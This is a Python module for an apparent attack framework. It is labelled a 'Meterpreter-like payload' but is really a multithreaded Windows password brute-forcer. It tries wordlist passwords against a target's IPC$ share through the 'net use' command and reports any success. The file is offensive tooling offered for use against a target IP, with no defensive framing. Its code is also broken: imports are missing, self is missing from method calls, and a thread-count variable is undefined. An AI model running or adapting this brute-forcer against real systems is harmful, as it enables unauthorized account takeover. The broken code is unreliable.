import pyfiglet
from collections import OrderedDict
import socket
import json
import os
import subprocess
from threading import Thread

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Meterpreter-Like Payload in Python',
            'Rank':'Excellent',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Python script that brute-forces Windows user passwords using an external wordlist. ',
            'Note':'**Uses: net use **: Leverages Windows built-in `net use` command for authentication attempts.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('', True,'Enter target IP')),
            ('USER', ('', True,'Enter username')),
            ('WORDLIST', ('', True,'Enter path to wordlist')),
            ('THREADS', ('', True,'Number of threads for concurrent attempts')),
            
           
               
                ])
                }
    def logo(self):
    	title = 'Meterpreter '
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <ip_address> | set USER <username> | set WORDLIST <path/to/file> | set THREADS <No. of Threads>, then run")
   
    # Windows Password Brute Force Function
    def windows_brute(self,target_ip, username, password):
      try:
        # Use net use command to attempt authentication
        command = f"net use \\\\{target_ip}\\IPC$ {password} /user:{username}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Check for successful authentication
        if "The command completed successfully" in result.stdout.decode():
            print(f"[+] Success! Password found: {password}")
            sys.exit(0)
        else:
            print(f"[-] Failed: {password}")
      except Exception as e:
        print(f"[-] Error: {e}")
    # Read Wordlist
    def load_wordlist(self,wordlist_path):
      try:
        with open(wordlist_path, 'r') as f:
            return [line.strip() for line in f]
      except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist_path}")
        return #sys.exit(1)
    # Threaded Brute Force
    def threaded_brute(self,target_ip, username, wordlist):
      for password in wordlist:
        while threading.active_count() > THREADS:
            pass  # Wait for threads to free up
        thread = Thread(target=windows_brute, args=(target_ip, username, password))
        thread.start()
    def execute(self):
        self.logo()
        TARGET_IP = self.info['Options']['RHOST'][0]
        WORDLIST_PATH = self.info['Options']['WORDLIST'][0]
        THREADS  = self.info['Options']['THREADS'][0]
        USERNAME  = self.info['Options']['USER'][0]
        wordlist = load_wordlist(WORDLIST_PATH)
        print(f"[*] Loaded {len(wordlist)} passwords from {WORDLIST_PATH}")
        print(f"[*] Starting brute force on {TARGET_IP} with {THREADS} threads...")
        self.threaded_brute(TARGET_IP, USERNAME, wordlist)
        
        return f"[+] Waiting for Attacker ..."
    